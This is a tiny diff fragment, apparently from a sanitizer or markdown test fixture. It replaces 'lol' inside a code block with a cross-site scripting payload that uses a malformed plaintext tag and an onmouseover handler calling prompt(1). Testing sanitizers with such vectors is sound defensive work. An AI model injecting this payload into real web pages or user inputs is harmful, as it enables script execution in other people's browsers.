@@ -5,7 +5,7 @@
 ```
 ###
 ```
-lol
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
 ```
 ###
 ```
